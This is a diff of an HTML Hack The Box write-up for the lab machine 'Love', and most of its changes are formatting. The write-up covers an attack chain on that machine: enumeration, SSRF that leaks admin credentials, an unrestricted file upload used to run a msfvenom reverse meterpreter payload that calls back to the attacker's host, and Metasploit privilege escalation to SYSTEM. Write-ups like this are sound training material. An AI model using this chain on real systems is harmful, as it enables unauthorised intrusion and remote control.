@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-02-05 Sat 19:58 -->
+<!-- 2022-03-23 Wed 21:01 -->
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>HTB | Love</title>
@@ -53,12 +53,12 @@
 <li><a href="#org766cf88">2.2.1. Virtual host enumeration</a></li>
 <li><a href="#org380880f">2.2.2. Enumerating <code>http://love.htb</code></a>
 <ul>
-<li><a href="#orge1b9092">2.2.2.1. Gobuster</a></li>
+<li><a href="#org59457c3">2.2.2.1. Gobuster</a></li>
 </ul>
 </li>
 <li><a href="#orgaa4aa18">2.2.3. Enumerating <code>http://staging.love.htb</code></a>
 <ul>
-<li><a href="#orgd9cc60a">2.2.3.1. Gobuster</a></li>
+<li><a href="#orgffb52f1">2.2.3.1. Gobuster</a></li>
 <li><a href="#orgcae9e06">2.2.3.2. <code>/beta.php</code></a></li>
 </ul>
 </li>
@@ -92,8 +92,8 @@
 <h2 id="org9c1a6f3"><span class="section-number-2">1</span> Introduction</h2>
 <div class="outline-text-2" id="text-1">
 <p>
-Welcome to this write-up for the Hack the Box machine: Love.
-Love was an easy rated Windows machine, running a webserver for a voting system and a file scanner located on a staging subdomain.
+Welcome to this write-up for the Hack the Box machine: Love.<br>
+Love was an easy rated Windows machine, running a webserver for a voting system and a file scanner located on a staging subdomain.<br>
 </p>
 </div>
 </div>
@@ -102,22 +102,22 @@ Love was an easy rated Windows machine, running a webserver for a voting system 
 <h2 id="org0dff92d"><span class="section-number-2">2</span> Recon</h2>
 <div class="outline-text-2" id="text-2">
 <p>
-First thing we should do is to get as much information about the box as possible.
-First we'll scan for open ports using <code>nmap</code>, once we know what's running on the machine we can tailor the rest of the reconnaissance to better fit.
+First thing we should do is to get as much information about the box as possible.<br>
+First we'll scan for open ports using <code>nmap</code>, once we know what's running on the machine we can tailor the rest of the reconnaissance to better fit.<br>
 </p>
 </div>
 <div id="outline-container-org33805a0" class="outline-3">
 <h3 id="org33805a0"><span class="section-number-3">2.1</span> Nmap</h3>
 <div class="outline-text-3" id="text-2-1">
 <p>
-Since this is just a challenge there is no reason to go super stealthy.
-I used the following command to enumerate all open ports, and check which version is running on the port:
+Since this is just a challenge there is no reason to go super stealthy.<br>
+I used the following command to enumerate all open ports, and check which version is running on the port:<br>
 </p>
 <pre class="example">
 $ sudo nmap -sV -p- -oA nmap/version_scan_all_ports 10.129.48.103
 </pre>
 
-<pre class="example" id="orge1e1a33">
+<pre class="example" id="orgd008dca">
 # Nmap 7.91 scan initiated Sun Jul 25 20:11:00 2021 as: nmap -sV -p- -oA nmap/version_scan_all_ports 10.129.48.103
 Nmap scan report for 10.129.48.103
 Host is up (0.035s latency).
@@ -152,7 +152,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 </pre>
 
 <p>
-Looking at the table below, we can deduce that it is a Windows machine running multiple webservers.
+Looking at the table below, we can deduce that it is a Windows machine running multiple webservers.<br>
 </p>
 <table>
 <caption class="t-above"><span class="table-number">Table 1:</span> Table over open ports</caption>
@@ -304,7 +304,7 @@ Looking at the table below, we can deduce that it is a Windows machine running m
 </table>
 
 <p>
-We also got the hostname <code>love.htb</code> from the scan results, so let's add that to <code>/etc/hosts</code> file:
+We also got the hostname <code>love.htb</code> from the scan results, so let's add that to <code>/etc/hosts</code> file:<br>
 </p>
 <pre class="example">
 $ sudo echo "10.129.48.103 love.htb" &gt;&gt; /etc/hosts
@@ -316,17 +316,17 @@ $ sudo echo "10.129.48.103 love.htb" &gt;&gt; /etc/hosts
 <h3 id="orgfe2e0c2"><span class="section-number-3">2.2</span> Web enumeration</h3>
 <div class="outline-text-3" id="text-2-2">
 <p>
-Since there are more than one webserver running, there is the possibility that they are mapped to virtual hosts.
-So let's start <code>gobuster</code> in virtual host mode and start enumerating.
+Since there are more than one webserver running, there is the possibility that they are mapped to virtual hosts.<br>
+So let's start <code>gobuster</code> in virtual host mode and start enumerating.<br>
 </p>
 </div>
 <div id="outline-container-org766cf88" class="outline-4">
 <h4 id="org766cf88"><span class="section-number-4">2.2.1</span> Virtual host enumeration</h4>
 <div class="outline-text-4" id="text-2-2-1">
 <p>
-For this enumeration I used the <code>subdomains-top1million-20000.txt</code> DNS wordlist from the <a href="https://github.com/danielmiessler/SecLists">SecLists repository</a>.
+For this enumeration I used the <code>subdomains-top1million-20000.txt</code> DNS wordlist from the <a href="https://github.com/danielmiessler/SecLists">SecLists repository</a>.<br>
 </p>
-<pre class="example" id="org23ef41b">
+<pre class="example" id="org9288f65">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/love ]
 └─&gt; $ gobuster vhost -u "http://love.htb" -w ~/repositories/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 ===============================================================
@@ -350,19 +350,19 @@ Progress: 18380 / 19967 (92.05%)
 ===============================================================
 </pre>
 <p>
-<code>staging.love.htb</code> sounds like a development server, which might be filled with vulnerabilties.
+<code>staging.love.htb</code> sounds like a development server, which might be filled with vulnerabilties.<br>
 </p>
 
 <p>
-This gives us the two targets:
+This gives us the two targets:<br>
 </p>
 <ul class="org-ul">
-<li><code>http://love.htb</code></li>
-<li><code>http://staging.love.htb</code></li>
+<li><code>http://love.htb</code><br></li>
+<li><code>http://staging.love.htb</code><br></li>
 </ul>
 
 <p>
-Let's start enumerating files and directories with <code>gobuster</code>.
+Let's start enumerating files and directories with <code>gobuster</code>.<br>
 </p>
 </div>
 </div>
@@ -370,23 +370,23 @@ Let's start enumerating files and directories with <code>gobuster</code>.
 <h4 id="org380880f"><span class="section-number-4">2.2.2</span> Enumerating <code>http://love.htb</code></h4>
 <div class="outline-text-4" id="text-2-2-2">
 <p>
-As you can see on the image below, there isn't a lot we can do regarding the homepage of this site.
+As you can see on the image below, there isn't a lot we can do regarding the homepage of this site.<br>
 </p>
 
-<figure id="org2025530">
-<img src="assets/2021-07-25_20-13-13_screenshot.png" alt="2021-07-25_20-13-13_screenshot.png">
+<figure id="org6a7345a">
+<img src="assets/2021-07-25_20-13-13_screenshot.png" alt="2021-07-25_20-13-13_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>Index of <code>http://love.htb</code></figcaption>
 </figure>
 
 <p>
-Let us start by enumerating the main site using <code>gobuster</code>, and hope that we get something more useful than that login page.
+Let us start by enumerating the main site using <code>gobuster</code>, and hope that we get something more useful than that login page.<br>
 </p>
 </div>
-<div id="outline-container-orge1b9092" class="outline-5">
-<h5 id="orge1b9092"><span class="section-number-5">2.2.2.1</span> Gobuster</h5>
+<div id="outline-container-org59457c3" class="outline-5">
+<h5 id="org59457c3"><span class="section-number-5">2.2.2.1</span> Gobuster</h5>
 <div class="outline-text-5" id="text-2-2-2-1">
-<pre class="example" id="orgcc476d0">
+<pre class="example" id="org581a40f">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/love ]
 └─&gt; $ gobuster dir -u "http://love.htb" -w ~/repositories/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -b 403,404 -x php -d                                                                                             20:55
 ===============================================================
@@ -420,8 +420,8 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 </pre>
 
 <p>
-Looking at the scan results from <code>gobuster</code>, we can see that there is an admin interface in the <code>/admin/</code> directory.
-But it can only be accessed using matching credentials.
+Looking at the scan results from <code>gobuster</code>, we can see that there is an admin interface in the <code>/admin/</code> directory.<br>
+But it can only be accessed using matching credentials.<br>
 </p>
 </div>
 </div>
@@ -431,26 +431,26 @@ But it can only be accessed using matching credentials.
 <h4 id="orgaa4aa18"><span class="section-number-4">2.2.3</span> Enumerating <code>http://staging.love.htb</code></h4>
 <div class="outline-text-4" id="text-2-2-3">
 <p>
-As you can see there isn't a whole lot going on homepage for the staging site.
+As you can see there isn't a whole lot going on homepage for the staging site.<br>
 </p>
 <p>
-<img src="assets/2021-07-25_23-47-04_screenshot.png" alt="2021-07-25_23-47-04_screenshot.png">
-We can see that there is a Demo page, which links to <code>/beta.php</code>.
-There is a user input, but looking at the source code of the page we'll see that nothing happens once submitted.
+<img src="assets/2021-07-25_23-47-04_screenshot.png" alt="2021-07-25_23-47-04_screenshot.png"><br>
+We can see that there is a Demo page, which links to <code>/beta.php</code>.<br>
+There is a user input, but looking at the source code of the page we'll see that nothing happens once submitted.<br>
 </p>
 
 <p>
-Just to be sure that we don't miss anything, I'll enumerate this server with <code>gobuster</code>.
+Just to be sure that we don't miss anything, I'll enumerate this server with <code>gobuster</code>.<br>
 </p>
 </div>
-<div id="outline-container-orgd9cc60a" class="outline-5">
-<h5 id="orgd9cc60a"><span class="section-number-5">2.2.3.1</span> Gobuster</h5>
+<div id="outline-container-orgffb52f1" class="outline-5">
+<h5 id="orgffb52f1"><span class="section-number-5">2.2.3.1</span> Gobuster</h5>
 <div class="outline-text-5" id="text-2-2-3-1">
 <p>
-As can be seen on the results below, there isn't anything of interest except for <code>/beta.php</code>.
-So let us take a closer look at that!
+As can be seen on the results below, there isn't anything of interest except for <code>/beta.php</code>.<br>
+So let us take a closer look at that!<br>
 </p>
-<pre class="example" id="org00c9096">
+<pre class="example" id="orgd27b68c">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/love ]
 └─&gt; $ gobuster dir -u "http://staging.love.htb" -w ~/repositories/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php -d -b 404,403 -o gobuster/staging.love.htb
 ===============================================================
@@ -484,17 +484,17 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 <h5 id="orgcae9e06"><span class="section-number-5">2.2.3.2</span> <code>/beta.php</code></h5>
 <div class="outline-text-5" id="text-2-2-3-2">
 <p>
-This accepts a url pointing to a specific file somewhere on the internet.
+This accepts a url pointing to a specific file somewhere on the internet.<br>
 </p>
 
-<figure id="org81b90f1">
-<img src="./assets/2021-07-25_23-45-36_screenshot.png" alt="2021-07-25_23-45-36_screenshot.png">
+<figure id="org388acb1">
+<img src="./assets/2021-07-25_23-45-36_screenshot.png" alt="2021-07-25_23-45-36_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 2: </span>Image of <code>/beta.php</code></figcaption>
 </figure>
 
 <p>
-This could be vulnerable to a Server Side Request Forgery (SSRF) attack.
+This could be vulnerable to a Server Side Request Forgery (SSRF) attack.<br>
 </p>
 </div>
 </div>
@@ -506,27 +506,27 @@ This could be vulnerable to a Server Side Request Forgery (SSRF) attack.
 <h2 id="org5a41094"><span class="section-number-2">3</span> Exploitation</h2>
 <div class="outline-text-2" id="text-3">
 <p>
-We have done all necessary reconnaissance up to this point.
-So let us begin attacking this box, by first gaining access to the voting systems admin page.
+We have done all necessary reconnaissance up to this point.<br>
+So let us begin attacking this box, by first gaining access to the voting systems admin page.<br>
 </p>
 </div>
 <div id="outline-container-org737fd2e" class="outline-3">
 <h3 id="org737fd2e"><span class="section-number-3">3.1</span> Getting admin credentials from ssrf</h3>
 <div class="outline-text-3" id="text-3-1">
 <p>
-If we point the site to <code>http://127.0.0.1/index.php</code>, we will see that some of the target website is rendered.
+If we point the site to <code>http://127.0.0.1/index.php</code>, we will see that some of the target website is rendered.<br>
 </p>
 
-<figure id="orgbd8e9e8">
-<img src="assets/2021-07-26_00-05-39_screenshot.png" alt="2021-07-26_00-05-39_screenshot.png">
+<figure id="orga66b979">
+<img src="assets/2021-07-26_00-05-39_screenshot.png" alt="2021-07-26_00-05-39_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 3: </span>SSRF pointing to voter login page</figcaption>
 </figure>
 
 <p>
-The entire request sent by the form can be seen below.
+The entire request sent by the form can be seen below.<br>
 </p>
-<pre class="example" id="org2cbf255">
+<pre class="example" id="org50702d7">
 POST http://staging.love.htb/beta.php HTTP/1.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -547,18 +547,18 @@ file=http%3A%2F%2F127.0.0.1%2Findex.php&amp;read=Scan+file
 </pre>
 
 <p>
-Let's us try the webserver running on port <code>5000</code>, just to see if there is anything interesting.
+Let's us try the webserver running on port <code>5000</code>, just to see if there is anything interesting.<br>
 </p>
 
-<figure id="org7a3c7a8">
-<img src="assets/2021-07-26_00-14-56_screenshot.png" alt="2021-07-26_00-14-56_screenshot.png">
+<figure id="orgfa5fe6e">
+<img src="assets/2021-07-26_00-14-56_screenshot.png" alt="2021-07-26_00-14-56_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 4: </span>Scanning <code>http://127.0.0.1:5000/index.php</code></figcaption>
 </figure>
 
 <p>
-And we got our first set of credentials!
-<code>admin:@LoveIsInTheAir!!!!</code>
+And we got our first set of credentials!<br>
+<code>admin:@LoveIsInTheAir!!!!</code><br>
 </p>
 </div>
 </div>
@@ -566,30 +566,30 @@ And we got our first set of credentials!
 <h3 id="org4d2b7bb"><span class="section-number-3">3.2</span> Logging into <code>/admin/</code></h3>
 <div class="outline-text-3" id="text-3-2">
 <p>
-Now that we have the username and password for the admin area of the voting system, let's login and start poking around at the different functionalities.
+Now that we have the username and password for the admin area of the voting system, let's login and start poking around at the different functionalities.<br>
 </p>
 
 <p>
-Logging in as <code>admin</code> gives the following interface
+Logging in as <code>admin</code> gives the following interface<br>
 </p>
 
-<figure id="orgb9bfaf8">
-<img src="assets/2021-07-26_00-26-15_screenshot.png" alt="2021-07-26_00-26-15_screenshot.png">
+<figure id="org17a330f">
+<img src="assets/2021-07-26_00-26-15_screenshot.png" alt="2021-07-26_00-26-15_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 5: </span>Admin interface for voting system</figcaption>
 </figure>
 
 <p>
-One of the sites which peaked my interest was the <code>/candidates.php</code> file in the <code>/admin/</code> directory.
+One of the sites which peaked my interest was the <code>/candidates.php</code> file in the <code>/admin/</code> directory.<br>
 </p>
 
 <p>
-On this site I poked around found the following three vulnerabilties on this endpoint:
+On this site I poked around found the following three vulnerabilties on this endpoint:<br>
 </p>
 <ul class="org-ul">
-<li>XSS</li>
-<li>SQL injection</li>
-<li>Insecure File upload</li>
+<li>XSS<br></li>
+<li>SQL injection<br></li>
+<li>Insecure File upload<br></li>
 </ul>
 </div>
 
@@ -597,14 +597,14 @@ On this site I poked around found the following three vulnerabilties on this end
 <h4 id="org4c8b787"><span class="section-number-4">3.2.1</span> XSS</h4>
 <div class="outline-text-4" id="text-3-2-1">
 <p>
-All of the fields for candidates seem, vulnerable to XSS attacks.
-It was possible to pop an alert in the description of a candidate.
+All of the fields for candidates seem, vulnerable to XSS attacks.<br>
+It was possible to pop an alert in the description of a candidate.<br>
 </p>
 
 <p>
-<img src="assets/2021-07-26_00-44-08_screenshot.png" alt="2021-07-26_00-44-08_screenshot.png">
-However, it didn't seem to be affecting the voters.
-And since we are already admin, there is not a that we could gain from this.
+<img src="assets/2021-07-26_00-44-08_screenshot.png" alt="2021-07-26_00-44-08_screenshot.png"><br>
+However, it didn't seem to be affecting the voters.<br>
+And since we are already admin, there is not a that we could gain from this.<br>
 </p>
 </div>
 </div>
@@ -612,19 +612,19 @@ And since we are already admin, there is not a that we could gain from this.
 <h4 id="org44acea4"><span class="section-number-4">3.2.2</span> SQL injection</h4>
 <div class="outline-text-4" id="text-3-2-2">
 <p>
-There was also an error in the implementation of SQL, but I couldn't put it to any use.
+There was also an error in the implementation of SQL, but I couldn't put it to any use.<br>
 </p>
 
-<figure id="org3e92fcd">
-<img src="assets/2021-07-26_00-54-21_screenshot.png" alt="2021-07-26_00-54-21_screenshot.png">
+<figure id="org5702662">
+<img src="assets/2021-07-26_00-54-21_screenshot.png" alt="2021-07-26_00-54-21_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 6: </span>Error in SQL syntax</figcaption>
 </figure>
 
 <p>
-The parameter vulnerable to SQL injection was the <code>plaform</code> parameter shown in the POST request below.
+The parameter vulnerable to SQL injection was the <code>plaform</code> parameter shown in the POST request below.<br>
 </p>
-<pre class="example" id="orgb381bcb">
+<pre class="example" id="org96f5150">
 POST http://love.htb/admin/candidates_edit.php HTTP/1.1
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -645,8 +645,8 @@ Host: love.htb
 id=18&amp;firstname=test&amp;lastname=test&amp;position=8&amp;platform=%27--&amp;edit=
 </pre>
 <p>
-Since SQL injection isn't my strongest attack, I tested the parameter using <code>SQLmap</code>.
-But without success.
+Since SQL injection isn't my strongest attack, I tested the parameter using <code>SQLmap</code>.<br>
+But without success.<br>
 </p>
 </div>
 </div>
@@ -654,13 +654,13 @@ But without success.
 <h4 id="orge839763"><span class="section-number-4">3.2.3</span> File-upload</h4>
 <div class="outline-text-4" id="text-3-2-3">
 <p>
-This brings us to the last vulnerability, which is also the most powerful.
+This brings us to the last vulnerability, which is also the most powerful.<br>
 </p>
 
 <p>
-When creating a candidate, it is possible to upload a photo of the candidate.
-But there isn't any checks on what the filetype actually is, meaning we can upload any file we that we want to.
-This is the vulnerability we will use to get a shell on the system.
+When creating a candidate, it is possible to upload a photo of the candidate.<br>
+But there isn't any checks on what the filetype actually is, meaning we can upload any file we that we want to.<br>
+This is the vulnerability we will use to get a shell on the system.<br>
 </p>
 </div>
 </div>
@@ -669,13 +669,13 @@ This is the vulnerability we will use to get a shell on the system.
 <h3 id="org9f16c24"><span class="section-number-3">3.3</span> File-upload on <code>/admin/candidates.php</code></h3>
 <div class="outline-text-3" id="text-3-3">
 <p>
-Because this is a Windows box, I'll be taking the liberty of using the Metasploit framework.
-I'll do this in two parts, first we'll create a reverse meterpreter shell.
-And a small php script which will execute our meterpreter shell.
+Because this is a Windows box, I'll be taking the liberty of using the Metasploit framework.<br>
+I'll do this in two parts, first we'll create a reverse meterpreter shell.<br>
+And a small php script which will execute our meterpreter shell.<br>
 </p>
 
 <p>
-The php script that will execute our meterpreter shell, is rather simple as you can see below.
+The php script that will execute our meterpreter shell, is rather simple as you can see below.<br>
 </p>
 <div class="org-src-container">
 <label class="org-src-name"><span class="listing-number">Listing 1: </span>Shell execution script</label><pre class="src src-php">&lt;?php
@@ -685,9 +685,9 @@ exec("shell.exe");
 </div>
 
 <p>
-The meterpreter shell is generated using the <code>msfvenom</code>
+The meterpreter shell is generated using the <code>msfvenom</code><br>
 </p>
-<pre class="example" id="orgb866ee3">
+<pre class="example" id="org3eb43ae">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/love/shells ]
 └─&gt; $ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.87 LPORT=4444 -f exe &gt; shell.exe                15:37
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -698,23 +698,23 @@ Final size of exe file: 73802 bytes
 
 </pre>
 <p>
-And a handler setup in <code>msfconsole</code> with options matching the ones in the payload generation.
+And a handler setup in <code>msfconsole</code> with options matching the ones in the payload generation.<br>
 </p>
 
 <p>
-Now we upload both files, and navigate to the php file.
-And voila we have a shell!
+Now we upload both files, and navigate to the php file.<br>
+And voila we have a shell!<br>
 </p>
-<pre class="example" id="org10ec037">
+<pre class="example" id="org7dbfec8">
 meterpreter &gt; getuid
 Server username: LOVE\Phoebe
 meterpreter &gt;
 </pre>
 
 <p>
-Let's navigate to the desktop and get the flag!
+Let's navigate to the desktop and get the flag!<br>
 </p>
-<pre class="example" id="org572b807">
+<pre class="example" id="orgf43ab99">
 meterpreter &gt; cd Desktop
 meterpreter &gt; ls
 Listing: C:\Users\Phoebe\Desktop
@@ -736,20 +736,20 @@ meterpreter &gt;
 <h2 id="org5501f08"><span class="section-number-2">4</span> Priv esc</h2>
 <div class="outline-text-2" id="text-4">
 <p>
-Now that we have a normal user shell, we should do some enumeration to figure out how we should go about gaining a root shell.
+Now that we have a normal user shell, we should do some enumeration to figure out how we should go about gaining a root shell.<br>
 </p>
 
 <p>
-Since this is done through meterpreter, we can use a lot of modules from metasploit.
+Since this is done through meterpreter, we can use a lot of modules from metasploit.<br>
 </p>
 </div>
 <div id="outline-container-orgb732cdd" class="outline-3">
 <h3 id="orgb732cdd"><span class="section-number-3">4.1</span> Local auto-suggest</h3>
 <div class="outline-text-3" id="text-4-1">
 <p>
-This is a very nifty little module, which will suggest local exploits that can be used to elevate privileges.
+This is a very nifty little module, which will suggest local exploits that can be used to elevate privileges.<br>
 </p>
-<pre class="example" id="orgbd10063">
+<pre class="example" id="orgb55e9ec">
 meterpreter &gt; run post/multi/recon/local_exploit_suggester
 
 [*] 10.129.148.112 - Collecting local exploits for x86/windows...
@@ -762,7 +762,7 @@ meterpreter &gt; run post/multi/recon/local_exploit_suggester
 [+] 10.129.148.112 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
 </pre>
 <p>
-As you can see the target is vulnerable to the <code>always_install_elevated</code> exploit.
+As you can see the target is vulnerable to the <code>always_install_elevated</code> exploit.<br>
 </p>
 </div>
 </div>
@@ -770,10 +770,10 @@ As you can see the target is vulnerable to the <code>always_install_elevated</co
 <h3 id="orgaf0842f"><span class="section-number-3">4.2</span> Always install elevated</h3>
 <div class="outline-text-3" id="text-4-2">
 <p>
-Since the autosuggester mentioned this exploit, let's test if it is correct.
-This is done by running the following commands:
+Since the autosuggester mentioned this exploit, let's test if it is correct.<br>
+This is done by running the following commands:<br>
 </p>
-<pre class="example" id="org2b326cd">
+<pre class="example" id="org104d983">
 meterpreter &gt; shell
 Process 6380 created.
 Channel 6 created.
@@ -797,13 +797,13 @@ HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
 C:\Users\Phoebe\Desktop&gt;
 </pre>
 <p>
-The registrykeys are enabled meaning we are vulnerable, just as the <code>local_exploit_suggester</code> said we were.
+The registrykeys are enabled meaning we are vulnerable, just as the <code>local_exploit_suggester</code> said we were.<br>
 </p>
 
 <p>
-Now we can run the exploit module:
+Now we can run the exploit module:<br>
 </p>
-<pre class="example" id="orge285e7d">
+<pre class="example" id="orgafc7c64">
 meterpreter &gt; run exploit/windows/local/always_install_elevated LHOST=10.10.14.87
 
 [*] Started reverse TCP handler on 10.10.14.87:4444
@@ -815,13 +815,13 @@ meterpreter &gt; run exploit/windows/local/always_install_elevated LHOST=10.10.1
 [*] Session 9 created in the background.
 </pre>
 <p>
-And a session was created, which means we have root!
+And a session was created, which means we have root!<br>
 </p>
 
 <p>
-Now all we need is to switch to that session, and read the root flag.
+Now all we need is to switch to that session, and read the root flag.<br>
 </p>
-<pre class="example" id="org95ec50c">
+<pre class="example" id="org2a3e3eb">
 meterpreter &gt; getuid
 Server username: NT AUTHORITY\SYSTEM
 meterpreter &gt; pwd
